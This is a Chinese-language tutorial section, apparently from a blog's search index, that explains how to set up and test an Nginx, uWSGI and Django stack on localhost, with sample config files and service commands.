<h3 id="0x05-Nginx、uWSGI测试环境"><a href="#0x05-Nginx、uWSGI测试环境" class="headerlink" title="0x05 Nginx、uWSGI测试环境"></a>0x05 Nginx、uWSGI测试环境</h3><h4 id="1-web-client-lt-gt-uWSGI-lt-gt-python-连通性测试"><a href="#1-web-client-lt-gt-uWSGI-lt-gt-python-连通性测试" class="headerlink" title="1. web client &lt;-&gt; uWSGI &lt;-&gt; python 连通性测试:"></a>1. web client &lt;-&gt; uWSGI &lt;-&gt; python 连通性测试:</h4><p>在工程根目录下创建test.py，内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">def application(env, start_response):</div><div class="line">	start_response(&apos;200 OK&apos;, [(&apos;Content-Type&apos;,&apos;text/html&apos;)])</div><div class="line">	return [&quot;Hello World&quot;]</div></pre></td></tr></table></figure></p>
<p>写入完成后执行以下命令：  </p>
<p><code>sudo uwsgi --http :8000 --wsgi-file test.py</code><br>浏览器访问<code>http://localhost:8000</code>，看浏览器是否正常输出””Hello World”<br>如果输出正常，表明<code>web client &lt;-&gt; uWSGI &lt;-&gt; python</code> 连通性正常  </p>
<h4 id="2-web-client-lt-gt-uWSGI-lt-gt-Django-连通性测试"><a href="#2-web-client-lt-gt-uWSGI-lt-gt-Django-连通性测试" class="headerlink" title="2. web client &lt;-&gt; uWSGI &lt;-&gt; Django 连通性测试:"></a>2. web client &lt;-&gt; uWSGI &lt;-&gt; Django 连通性测试:</h4><p>在工程根目录下：  </p>
<p><code>python manage.py runserver</code><br>访问<code>http://127.0.0.1:8000</code>查看效果<br>如果没有问题，表明<code>web client &lt;-&gt; uWSGI &lt;-&gt; Django</code> 连通性正常  </p>
<h4 id="3-web-client-lt-gt-web-server-连通性测试—配置Nginx："><a href="#3-web-client-lt-gt-web-server-连通性测试—配置Nginx：" class="headerlink" title="3.web client &lt;-&gt; web server 连通性测试—配置Nginx："></a>3.web client &lt;-&gt; web server 连通性测试—配置Nginx：</h4><p>启动、停止和重启<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo /etc/init.d/nginx start</div><div class="line">sudo /etc/init.d/nginx stop</div><div class="line">sudo /etc/init.d/nginx restart</div></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo service nginx start</div><div class="line">sudo service nginx stop</div><div class="line">sudo service nginx restart</div></pre></td></tr></table></figure></p>
<p>启动nigix服务后，打开浏览器，访问127.0.0.1:80，出现如下图示则表明配置成功<br><img src="http://upload-images.jianshu.io/upload_images/1898272-93e129f9b34a8f57.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>上述的一切正常，则表明<code>web client &lt;-&gt; web server</code> 连通性正常</p>
<h4 id="4-web-server-lt-gt-socket-lt-gt-uWSGI-连通性测试："><a href="#4-web-server-lt-gt-socket-lt-gt-uWSGI-连通性测试：" class="headerlink" title="4. web server &lt;-&gt; socket &lt;-&gt; uWSGI 连通性测试："></a>4. web server &lt;-&gt; socket &lt;-&gt; uWSGI 连通性测试：</h4><p>在工程根目录下的server_conf/wsl_nginx.conf内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"># configuration of the server</div><div class="line">server &#123;</div><div class="line">    # the port your site will be served on</div><div class="line">    listen 8000;</div><div class="line">    </div><div class="line">    # the domain name it will serve for</div><div class="line">    # TODO: change the domain to your own</div><div class="line">    server_name 127.0.0.1; # substitute your machine&apos;s IP address or FQDN</div><div class="line">    charset utf-8;</div><div class="line"></div><div class="line">    # max upload size</div><div class="line">    client_max_body_size 75M;   # adjust to taste</div><div class="line"></div><div class="line">    # Django media</div><div class="line">    location /media  &#123;</div><div class="line">        alias /home/wsl/wslcore/media;  # your Django project&apos;s media files - amend as required</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    location /static &#123;</div><div class="line">        alias /home/wsl/wslcore/static; # your Django project&apos;s static files - amend as required</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    # Finally, send all non-media requests to the Django server.</div><div class="line">    location / &#123;</div><div class="line">        uwsgi_pass  127.0.0.1:9191;</div><div class="line">        include /home/wsl/wslcore/server_conf/uwsgi_params; # the uwsgi_params file you installed</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><br></p>
<ul>
<li>该配置告诉Nginx使用8000作为服务的端口，同时提供了static和media的handle处理，路径如上。其他的服务（即动态操作）通过127.0.0.1:9191这个handle服务去处理。<br><br></li>
<li>为了让Nginx服务器能识别这个配置，创建一个链接给该文件，如下：<br><code>sudo ln -s /home/wsl/wslcore/server_conf/wsl_nginx.conf /etc/nginx/sites-enabled</code><br><br></li>
<li>将你网站使用到的静态文件自动搜集起来放到Nginx指定的目录下：<br><code>mkdir media static</code><br><code>sudo python manage.py collectstatic</code><br><br></li>
<li>重启nigix服务，<code>sudo /etc/init.d/nginx restart</code><br><br></li>
<li>工程根目录下<code>sudo uwsgi --socket :9191 --wsgi-file test.py</code><br><br></li>
<li>通过浏览器访问127.0.0.1:8000，如果能正常显示”Hello World“则表明<code>web client &lt;-&gt; web server &lt;-&gt; socket &lt;-&gt; uWSGI &lt;-&gt; Python</code> 配置成功</li>
</ul>
<h4 id="5-通过-ini文件去执行uWSGI"><a href="#5-通过-ini文件去执行uWSGI" class="headerlink" title="5. 通过.ini文件去执行uWSGI:"></a>5. 通过.ini文件去执行uWSGI:</h4><p>server_conf中的uwsgi.ini：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">[uwsgi]</div><div class="line"># Django-related settings</div><div class="line"></div><div class="line">## the base directory (full path)</div><div class="line">chdir = /home/wsl/wslcore</div><div class="line"></div><div class="line">## Django&apos;s wsgi file</div><div class="line">module = wslcore.wsgi</div><div class="line"></div><div class="line">## master</div><div class="line">master = true</div><div class="line"></div><div class="line">## pidfile</div><div class="line">pidfile = /home/wsl/wslcore/.tmp/wslcore-master.pid</div><div class="line"></div><div class="line">## maximum number of worker processes</div><div class="line">processes = 10</div><div class="line"></div><div class="line">## Socket use tcp/ip</div><div class="line">socket = 127.0.0.1:9191</div><div class="line"></div><div class="line">## clear environment on exit</div><div class="line">vacuum = true</div><div class="line"></div><div class="line">#run as a daemon</div><div class="line">#daemonize = /var/log/uwsgi/yourproject.log</div></pre></td></tr></table></figure></p>
<p>配置完成上述的文件和执行<code>sudo uwsgi --ini server_conf/uwsgi.ini</code>就可以一键让服务运行起来.  </p>
<p>或者使用工程根目录下提供的脚本<code>sudo ./run.sh</code>，其中最后执行的核心部分即为上述命令，所以达到的是同样的效果.  </p>
<p>如果要服务在后台运行，就取消uwsgi.ini末尾行的注释即可，以守护进程的形式运行。 </p>
<hr>
<p>如果要结束当前daemonize，并且取消守护进行模式时，可以修改.ini和.conf这两个配置文件中的sock端口和监听端口，以及注释掉daemonize那行，之后再重新执行<code>sudo run.sh</code>时，原先的进程将被结束、替换为新建的进程。  </p>
<p>有时候调试时光重启nginx服务是不管用的，此时就需要重启该守护进程，或者取消它、改为命令行下阻塞模式并输出运行信息。</p>
<p>更多使用参考：<a href="https://uwsgi-docs.readthedocs.io/en/latest/" target="_blank" rel="external">uWSGI官方文档</a></p>
]]></content>
    </entry>
    
  
  
</search>
